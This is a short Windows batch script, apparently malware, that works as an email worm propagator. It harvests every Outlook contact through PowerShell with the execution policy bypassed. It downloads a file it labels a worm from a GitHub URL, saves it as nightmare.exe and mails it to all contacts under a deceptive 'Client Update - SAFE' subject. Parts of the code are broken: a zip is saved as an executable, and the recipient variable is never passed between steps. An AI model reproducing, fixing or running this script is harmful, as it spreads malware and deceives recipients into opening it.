@echo off
set "emailSubject=Client Update - SAFE"
set "emailBody=Please find the most recent update file attached."

set "senderEmail=scumdestroy@email.com"
set "senderPassword=yourpa$$w0rd"
set "smtpServer=smtp.gmail.com"
set "smtpPort=587"

REM Retrieve contacts from Outlook using PowerShell
powershell.exe -ExecutionPolicy Bypass -Command "$Outlook = New-Object -ComObject Outlook.Application; $Contacts = $Outlook.Session.GetDefaultFolder(10).Items; $RecipientEmails = $Contacts | ForEach-Object { $_.Email1Address } | Where-Object { $_ -ne $null }; $Recipients = $RecipientEmails -join ' '; $Recipients"

REM Download worm
curl -L "https://github.com/scumdestroy/wormed/archive/master.zip" -o "C:\temp\nightmare.exe"

REM Send to all contacts
powershell.exe -ExecutionPolicy Bypass -Command "Send-MailMessage -From '%senderEmail%' -To '%Recipients%' -Subject '%emailSubject%' -Body '%emailBody%' -Attachments 'C:\temp\nightmare.exe' -SmtpServer '%smtpServer%' -Port '%smtpPort%' -Credential (New-Object System.Management.Automation.PSCredential('%senderEmail%',(ConvertTo-SecureString -String '%senderPassword%' -AsPlainText -Force)))"


pause
